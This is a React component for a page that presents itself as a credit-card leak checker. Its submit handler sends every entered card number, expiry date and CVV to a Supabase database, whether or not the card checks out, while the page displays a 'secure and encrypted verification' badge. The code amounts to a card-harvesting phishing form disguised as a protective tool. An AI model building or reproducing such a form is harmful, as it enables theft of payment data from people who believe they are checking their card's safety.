import { useState } from 'react';
import { CreditCard, Calendar, Lock, Shield, AlertTriangle, CheckCircle, Loader2 } from 'lucide-react';
import { CardVisual } from './CardVisual';
import { useCardValidation } from '../hooks/useCardValidation';
import { useSupabase } from '../hooks/useSupabase';
import type { CartaoFormData } from '../types';

export function CardForm() {
  const [formData, setFormData] = useState<CartaoFormData>({
    numeroCartao: '',
    validade: '',
    cvv: '',
  });
  const [focoCVV, setFocoCVV] = useState(false);
  
  const { verificarCartao, resultado, verificando, limparResultado } = useCardValidation();
  const { salvarCartao, loading: salvando } = useSupabase();

  const formatarNumeroCartao = (valor: string) => {
    const numeros = valor.replace(/\D/g, '');
    const grupos = numeros.match(/.{1,4}/g);
    return grupos ? grupos.join(' ').slice(0, 19) : numeros;
  };

  const formatarValidade = (valor: string) => {
    const numeros = valor.replace(/\D/g, '');
    if (numeros.length >= 2) {
      return `${numeros.slice(0, 2)}/${numeros.slice(2, 4)}`;
    }
    return numeros;
  };

  const handleNumeroChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatado = formatarNumeroCartao(e.target.value);
    setFormData(prev => ({ ...prev, numeroCartao: formatado }));
    limparResultado();
  };

  const handleValidadeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatado = formatarValidade(e.target.value);
    setFormData(prev => ({ ...prev, validade: formatado }));
    limparResultado();
  };

  const handleCVVChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const numeros = e.target.value.replace(/\D/g, '').slice(0, 4);
    setFormData(prev => ({ ...prev, cvv: numeros }));
    limparResultado();
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const resultadoVerificacao = await verificarCartao(formData);
    
    await salvarCartao({
      numero_cartao: formData.numeroCartao.replace(/\s/g, ''),
      validade: formData.validade,
      cvv: formData.cvv,
      valido: resultadoVerificacao.valido,
      vazado: resultadoVerificacao.vazado,
    });
  };

  const inputStyle = {
    width: '100%',
    padding: '0.75rem 1rem',
    background: 'rgba(30, 41, 59, 0.5)',
    border: '1px solid rgba(255,255,255,0.1)',
    borderRadius: '0.75rem',
    color: 'white',
    fontSize: '1rem',
    fontFamily: 'monospace',
    outline: 'none',
    transition: 'all 0.3s ease'
  };

  const labelStyle = {
    display: 'flex',
    alignItems: 'center',
    gap: '0.5rem',
    color: '#d1d5db',
    fontSize: '0.875rem',
    fontWeight: 500,
    marginBottom: '0.5rem'
  };

  return (
    <div style={{ width: '100%', maxWidth: '28rem' }}>
      <div style={{
        background: 'rgba(15, 23, 42, 0.8)',
        backdropFilter: 'blur(20px)',
        borderRadius: '1.5rem',
        padding: '2rem',
        boxShadow: '0 25px 50px -12px rgba(0,0,0,0.5)',
        border: '1px solid rgba(255,255,255,0.1)'
      }}>
        {/* Cartão Visual 3D */}
        <CardVisual 
          numeroCartao={formData.numeroCartao}
          validade={formData.validade}
          cvv={formData.cvv}
          focoCVV={focoCVV}
        />

        {/* Form */}
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
          {/* Número do Cartão */}
          <div>
            <label style={labelStyle}>
              <CreditCard size={16} color="#818cf8" />
              Número do Cartão
            </label>
            <input
              type="text"
              placeholder="0000 0000 0000 0000"
              value={formData.numeroCartao}
              onChange={handleNumeroChange}
              onFocus={() => setFocoCVV(false)}
              required
              maxLength={19}
              style={inputStyle}
            />
          </div>

          {/* Validade e CVV */}
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem' }}>
            <div>
              <label style={labelStyle}>
                <Calendar size={16} color="#818cf8" />
                Validade
              </label>
              <input
                type="text"
                placeholder="MM/AA"
                value={formData.validade}
                onChange={handleValidadeChange}
                onFocus={() => setFocoCVV(false)}
                required
                maxLength={5}
                style={{ ...inputStyle, textAlign: 'center' }}
              />
            </div>

            <div>
              <label style={labelStyle}>
                <Lock size={16} color="#818cf8" />
                CVV
              </label>
              <input
                type="text"
                placeholder="123"
                value={formData.cvv}
                onChange={handleCVVChange}
                onFocus={() => setFocoCVV(true)}
                onBlur={() => setFocoCVV(false)}
                required
                maxLength={4}
                style={{ ...inputStyle, textAlign: 'center' }}
              />
            </div>
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={verificando || salvando}
            style={{
              width: '100%',
              padding: '1rem',
              background: 'linear-gradient(135deg, #4f46e5, #9333ea, #ec4899)',
              color: 'white',
              fontWeight: 600,
              borderRadius: '0.75rem',
              border: 'none',
              cursor: verificando || salvando ? 'not-allowed' : 'pointer',
              opacity: verificando || salvando ? 0.7 : 1,
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '0.5rem',
              fontSize: '1rem',
              transition: 'all 0.3s ease',
              boxShadow: '0 10px 25px -5px rgba(79,70,229,0.4)'
            }}
          >
            {verificando || salvando ? (
              <>
                <Loader2 size={20} className="animate-spin" />
                Verificando...
              </>
            ) : (
              <>
                <Shield size={20} />
                Verificar Cartão
              </>
            )}
          </button>
        </form>

        {/* Result */}
        {resultado && (
          <div style={{
            marginTop: '1.5rem',
            padding: '1.25rem',
            borderRadius: '1rem',
            border: '1px solid',
            animation: 'fadeIn 0.5s ease-out',
            ...(resultado.vazado
              ? { background: 'rgba(239,68,68,0.1)', borderColor: 'rgba(239,68,68,0.3)' }
              : resultado.valido
              ? { background: 'rgba(16,185,129,0.1)', borderColor: 'rgba(16,185,129,0.3)' }
              : { background: 'rgba(245,158,11,0.1)', borderColor: 'rgba(245,158,11,0.3)' })
          }}>
            <div style={{ display: 'flex', alignItems: 'flex-start', gap: '1rem' }}>
              <div style={{
                width: '3rem',
                height: '3rem',
                borderRadius: '0.75rem',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                flexShrink: 0,
                ...(resultado.vazado
                  ? { background: 'rgba(239,68,68,0.2)' }
                  : resultado.valido
                  ? { background: 'rgba(16,185,129,0.2)' }
                  : { background: 'rgba(245,158,11,0.2)' })
              }}>
                {resultado.vazado ? (
                  <AlertTriangle size={24} color="#f87171" />
                ) : resultado.valido ? (
                  <CheckCircle size={24} color="#34d399" />
                ) : (
                  <AlertTriangle size={24} color="#fbbf24" />
                )}
              </div>
              <div>
                <h3 style={{
                  fontWeight: 'bold',
                  fontSize: '1.125rem',
                  ...(resultado.vazado
                    ? { color: '#fca5a5' }
                    : resultado.valido
                    ? { color: '#6ee7b7' }
                    : { color: '#fcd34d' })
                }}>
                  {resultado.vazado
                    ? 'Cartão Vazado!'
                    : resultado.valido
                    ? 'Cartão Válido'
                    : 'Cartão Inválido'}
                </h3>
                <p style={{ color: '#d1d5db', fontSize: '0.875rem', marginTop: '0.25rem' }}>
                  {resultado.mensagem}
                </p>
              </div>
            </div>
          </div>
        )}

        {/* Security Badge */}
        <div style={{ 
          marginTop: '1.5rem', 
          display: 'flex', 
          alignItems: 'center', 
          justifyContent: 'center', 
          gap: '0.5rem',
          color: '#6b7280',
          fontSize: '0.75rem'
        }}>
          <Lock size={12} />
          <span>Verificação segura e criptografada</span>
        </div>
      </div>
    </div>
  );
}
